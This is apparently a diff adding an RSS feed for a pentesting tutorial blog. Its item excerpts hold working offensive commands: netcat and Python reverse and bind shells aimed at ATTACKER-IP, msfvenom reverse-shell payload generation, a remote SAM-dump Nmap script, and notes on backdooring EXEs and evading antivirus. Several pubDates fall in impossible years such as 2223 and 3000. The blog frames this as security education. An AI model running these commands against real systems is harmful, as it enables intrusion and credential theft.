@@ -1,0 +1,191 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>KCSEC</title>
+    <link>https://www.ivoidwarranties.tech/</link>
+    <description>Recent content on KCSEC</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <copyright>KCSEC</copyright>
+    <lastBuildDate>Mon, 01 Dec 3000 00:00:00 +0000</lastBuildDate>
+    
+	<atom:link href="https://www.ivoidwarranties.tech/index.xml" rel="self" type="application/rss+xml" />
+    
+    
+    <item>
+      <title>About Site</title>
+      <link>https://www.ivoidwarranties.tech/posts/about/site/</link>
+      <pubDate>Mon, 01 Dec 3000 00:00:00 +0000</pubDate>
+      
+      <guid>https://www.ivoidwarranties.tech/posts/about/site/</guid>
+      <description>What is this site and who am I ? My Name is K.C , Cyber Security is key to the world more than most know.
+The Aim try educate and help others get into the Cyber security world for the right reasons. With the growing threat for both consumers and businesses more people need to be aware of the threats surrounding them in their day to day life.
+This site is a collection of my findings, guides or just general info for people to read, learn and hopefully take inspiration.</description>
+    </item>
+    
+    <item>
+      <title>Nmap</title>
+      <link>https://www.ivoidwarranties.tech/posts/pentesting-tuts/nmap/master/</link>
+      <pubDate>Wed, 22 Oct 2223 00:00:00 +0000</pubDate>
+      
+      <guid>https://www.ivoidwarranties.tech/posts/pentesting-tuts/nmap/master/</guid>
+      <description>What is NMAP ? Nmap (Network Mapper), Is mother of all port scanners. Commonly used for network discovery and Service/Security enumeration. Use by Pentesters and System admins it can show exposed services on a target as well as system information.
+More information can be found on the Devs site HERE
+For those who prefer to use a GUI then check out Zenmap.
+Key Points of Nmap  Host discovery Port discovery &amp;amp; enumeration Service discovery Service version detection &amp;amp; enumeration Operating system version detection MAC address detection Vulnerability &amp;amp; exploit detection - NSE Scripts  Default scans Intense Scan</description>
+    </item>
+    
+    <item>
+      <title>Nmap - Cheatsheet</title>
+      <link>https://www.ivoidwarranties.tech/posts/pentesting-tuts/nmap/cheatsheet/</link>
+      <pubDate>Fri, 17 Oct 2223 00:00:00 +0000</pubDate>
+      
+      <guid>https://www.ivoidwarranties.tech/posts/pentesting-tuts/nmap/cheatsheet/</guid>
+      <description>Nmap Nikto Scan Scans for http (Web) servers on port 80 and pipes into Nikto for scanning.
+nmap -p80 10.0.1.0/24 -oG - | nikto.pl -h -  Scans for http/https servers on port 80 &amp;amp; 443 and pipes into Nikto.
+nmap -p80,443 10.0.1.0/24 -oG - | nikto.pl -h -  Target Specification Nmap is able to use hostnames, IP addresses and subnets.
+nmap www.company.domain.com nmap 192.168.1.1 nmap 10.0.0-255.1-254  Target Specific settings</description>
+    </item>
+    
+    <item>
+      <title>Nmap - NSE Scripts</title>
+      <link>https://www.ivoidwarranties.tech/posts/pentesting-tuts/nmap/nse-scripts/</link>
+      <pubDate>Thu, 09 Oct 2223 00:00:00 +0000</pubDate>
+      
+      <guid>https://www.ivoidwarranties.tech/posts/pentesting-tuts/nmap/nse-scripts/</guid>
+      <description>Get help for a script
+nmap --script-help=ssl-heartbleed  updating scripts
+nmap --script-updatedb  Location and finding of scripts
+Locate *.nse - Will find all NSE Scripts on machine /user/share/nmap/scripts/ -Default script location  Top Scripts SMB subnet discovery
+nmap -sS -sV --script smb-enum-shares.nse,smb-os-discovery.nse -p445,139 192.168.1.0/24  Dump SAM database remotely
+nmap -p 135,139,445 --script smb-pwdump --script-args-smbuser=USERNAME,smbpass=PASSWORD &amp;lt;Target&amp;gt;  Nmap NSE script to detect MS17-010 vuln used by WannaCry - Download</description>
+    </item>
+    
+    <item>
+      <title>NetCat CheatSheet</title>
+      <link>https://www.ivoidwarranties.tech/posts/pentesting-tuts/netcat/cheatsheet/</link>
+      <pubDate>Mon, 04 Sep 2220 00:00:00 +0000</pubDate>
+      
+      <guid>https://www.ivoidwarranties.tech/posts/pentesting-tuts/netcat/cheatsheet/</guid>
+      <description>Transferring a File nc -lvp 4444 &amp;gt; output.txt #Receive nc -nv &amp;lt;IP Address&amp;gt; &amp;lt; input.txt #Send  Netcat Bind Shell (Windows) nc -lvp 4444 -e cmd.exe nc -nv &amp;lt;IP Address&amp;gt; 4444 #Connect to the shell  Netcat Bind Shell (Linux) nc -lvp 4444 -e /bin/sh nc -nv &amp;lt;IP Address&amp;gt; 4444 #Connect to the shell  Netcat Reverse Shell (Windows) nc -lvp 443 # Listening for connection nc -nv &amp;lt;IP Address&amp;gt; 443 -e cmd.</description>
+    </item>
+    
+    <item>
+      <title>Reverse Shells</title>
+      <link>https://www.ivoidwarranties.tech/posts/pentesting-tuts/pentesting-reverse-shells/</link>
+      <pubDate>Thu, 16 Dec 2219 00:00:00 +0000</pubDate>
+      
+      <guid>https://www.ivoidwarranties.tech/posts/pentesting-tuts/pentesting-reverse-shells/</guid>
+      <description>Step one - Setup your Listener on attacking machine.
+nc -lvp &amp;lt;Port&amp;gt; #Example nc -lvp 4444  You can then use netcat to connect to that listener or a different reverse shell from the Target.
+nc &amp;lt;attacker_ip&amp;gt; &amp;lt;port&amp;gt; #Example: nc -l -v 192.168.225.143 4444  Here is a listener setup with NETCAT but the reverse shell is PERL.
+PYTHON Reverse Shell
+python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;quot;ATTACKER-IP&amp;quot;,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&amp;quot;/bin/sh&amp;quot;,&amp;quot;-i&amp;quot;]);&#39;  RUBY Reverse Shell
+ruby -rsocket -e&#39;f=TCPSocket.</description>
+    </item>
+    
+    <item>
+      <title>TheFatRat - Backdoor EXE</title>
+      <link>https://www.ivoidwarranties.tech/posts/pentesting-tuts/thefatrat/backdoor-exe/</link>
+      <pubDate>Mon, 08 Jun 2218 00:00:00 +0000</pubDate>
+      
+      <guid>https://www.ivoidwarranties.tech/posts/pentesting-tuts/thefatrat/backdoor-exe/</guid>
+      <description>So Here is a tool called TheFatRat, can check out HERE. It&amp;rsquo;s still in development but it&amp;rsquo;s easy to follow and has some easy to use features.
+TheFatRat Also have a bunch of backdooring techniques which are worth checking out.
+Bellow is how you backdoor and EXE with backdoor-Factory.
+ Select option 4 and enter the following info   Local IP &amp;lt; Attacker IP&amp;gt; LPORT  File Output name    Then it will ask you to Select the EXE you want to use</description>
+    </item>
+    
+    <item>
+      <title>TheFatRat - Easy payloads</title>
+      <link>https://www.ivoidwarranties.tech/posts/pentesting-tuts/thefatrat/payload-gen/</link>
+      <pubDate>Sun, 07 Jun 2218 00:00:00 +0000</pubDate>
+      
+      <guid>https://www.ivoidwarranties.tech/posts/pentesting-tuts/thefatrat/payload-gen/</guid>
+      <description>So Here is a tool called TheFatRat, can check out HERE. It&amp;rsquo;s still in development but it&amp;rsquo;s easy to follow and has some easy to use features.
+MSFVenon windows EXE Payload and Encoding You can check how to create a Metasploit reverse shell payload with just MsfVenom Here - ADD LINK HERE &amp;ndash;
+The neat thing that TheFatRat Does is add a load of encoding of the payload by default which will help with avoiding AV Detection.</description>
+    </item>
+    
+    <item>
+      <title>Generating Payloads with MsfVenom</title>
+      <link>https://www.ivoidwarranties.tech/posts/pentesting-tuts/metasploit/msfvenom/payload-gen/</link>
+      <pubDate>Fri, 10 Nov 2215 00:00:00 +0000</pubDate>
+      
+      <guid>https://www.ivoidwarranties.tech/posts/pentesting-tuts/metasploit/msfvenom/payload-gen/</guid>
+      <description>LIST PAYLOADS BINARIES Linux msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&amp;lt;Your IP Address&amp;gt; LPORT=&amp;lt;Your Port to Connect On&amp;gt; -f elf &amp;gt; shell.elf  Windows msfvenom -p windows/meterpreter/reverse_tcp LHOST=&amp;lt;Your IP Address&amp;gt; LPORT=&amp;lt;Your Port to Connect On&amp;gt; -f exe &amp;gt; shell.exe  Mac msfvenom -p osx/x86/shell_reverse_tcp LHOST=&amp;lt;Your IP Address&amp;gt; LPORT=&amp;lt;Your Port to Connect On&amp;gt; -f macho &amp;gt; shell.macho  WEB PAYLOADS PHP msfvenom -p php/meterpreter_reverse_tcp LHOST=&amp;lt;Your IP Address&amp;gt; LPORT=&amp;lt;Your Port to Connect On&amp;gt; -f raw &amp;gt; shell.</description>
+    </item>
+    
+    <item>
+      <title>Using Metasploit To Get A Reverse Shell</title>
+      <link>https://www.ivoidwarranties.tech/posts/pentesting-tuts/metasploit/simple-attack/</link>
+      <pubDate>Fri, 01 Sep 2215 00:00:00 +0000</pubDate>
+      
+      <guid>https://www.ivoidwarranties.tech/posts/pentesting-tuts/metasploit/simple-attack/</guid>
+      <description>So using the Metasploit Framework you can create a malicious payload (Meterpreter Reverse Shell) and then setup a handler to receive this connection. By doing this you have a shell on the target machine which you can then escalate privileges, steal data or any other post exploitation.
+This images shows how reverse and bind shells work.
+First step is to setup a handler to receive the reverse connection. This can be done using the Metasploit Framework as shown bellow.</description>
+    </item>
+    
+    <item>
+      <title>Metasploitable3 Master Notes</title>
+      <link>https://www.ivoidwarranties.tech/posts/lab/metasploitable3/master-notes/</link>
+      <pubDate>Tue, 04 Feb 2121 00:00:00 +0000</pubDate>
+      
+      <guid>https://www.ivoidwarranties.tech/posts/lab/metasploitable3/master-notes/</guid>
+      <description>These are my ongoing findings of metasploitable3.
+A Video/Tutorial of a setup guide will be posted later on.
+Nmap Scan Here are the list of open ports on the Vuln Server.
+Vuln scans I would recommend putting off vuln scans to make you learn the process of finding vulns yourself rather than automated.
+Nessus Nessus is a free vulnerability scanner (can be pro) similar to Open-vas. I&amp;rsquo;ve run a scan in nessus which then has been imported into the MSF Database.</description>
+    </item>
+    
+    <item>
+      <title>Dangerous Things - Implant Series</title>
+      <link>https://www.ivoidwarranties.tech/posts/rfid-nfc-research/dat-implant-series/</link>
+      <pubDate>Thu, 02 Nov 2017 00:00:00 +0000</pubDate>
+      
+      <guid>https://www.ivoidwarranties.tech/posts/rfid-nfc-research/dat-implant-series/</guid>
+      <description>Dangerous things do a range of implants, Too see for yourself check out their website and forum with the links bellow,
+https://dangerousthings.com/
+https://forum.dangerousthings.com/
+There are two different types of Implants currently the X Series and the Flex Series.
+XSeries The XSeries are the easier to implant and the chips are in cases in an small tube which can be injected into the skin.
+More information can be found here https://dangerousthings.</description>
+    </item>
+    
+    <item>
+      <title>Dangerous Things - Different Implants</title>
+      <link>https://www.ivoidwarranties.tech/posts/rfid-nfc-research/dat-implants/</link>
+      <pubDate>Wed, 01 Nov 2017 00:00:00 +0000</pubDate>
+      
+      <guid>https://www.ivoidwarranties.tech/posts/rfid-nfc-research/dat-implants/</guid>
+      <description>xEM RFID Tag [T5577 Emulator] https://dangerousthings.com/shop/xemi/
+The xEM is a great starter tag for people just getting into RFID projects. It is compatible with many inexpensive OEM and commercial 125kHz readers and stand-alone access controllers. xBT Temp Sensing RFID Tag [BioTherm] https://dangerousthings.com/shop/xbti/
+The xBT reports a simple ID number which works with any FDX-B tag reader, and can also transmit temperature sensor data to a compatible Bio-Thermo reader. xNT NFC Tag [NTAG216] https://dangerousthings.</description>
+    </item>
+    
+    <item>
+      <title>My Implants</title>
+      <link>https://www.ivoidwarranties.tech/posts/rfid-nfc-research/my-implants/</link>
+      <pubDate>Sun, 22 Oct 2017 00:00:00 +0000</pubDate>
+      
+      <guid>https://www.ivoidwarranties.tech/posts/rfid-nfc-research/my-implants/</guid>
+      <description>I&amp;rsquo;ve decided to order the following from Dangerious things to have implanted.
+ xEM FlexNT VivoKey (When Released)  Once the DesFire is out I will take a look at the potential applications for it that I could use.
+I&amp;rsquo;m waiting on parts and the implants which should take 1-2 months. Once arrived I will upload the implanting and healing procceses etc.
+Will then also fill out the Project posts as well.</description>
+    </item>
+    
+    <item>
+      <title>Cyber Security Events</title>
+      <link>https://www.ivoidwarranties.tech/posts/events/recommended/</link>
+      <pubDate>Sun, 01 Jan 2017 00:00:00 +0000</pubDate>
+      
+      <guid>https://www.ivoidwarranties.tech/posts/events/recommended/</guid>
+      <description>TechXLR8 2017  Location: Excel, London Event type: Technology Expo/Festival Event Photos:  TechXLR8 is a festival of technology taking you on a journey, between networks, Tech and consumer services, connecting industries and opening up new markets. TechXLR8 will showcase 8 leading technology events, giving you the opportunity to get the insights and build the relationships you need to be part of the fully Connected Future.
+With a shared exhibition and a comprehensive multi-track conference, TechXLR8 will enable you to better understand the infrastructure supporting the tech of tomorrow and the services and industries that will benefit from this fast evolving world.</description>
+    </item>
+    
+  </channel>
+</rss>
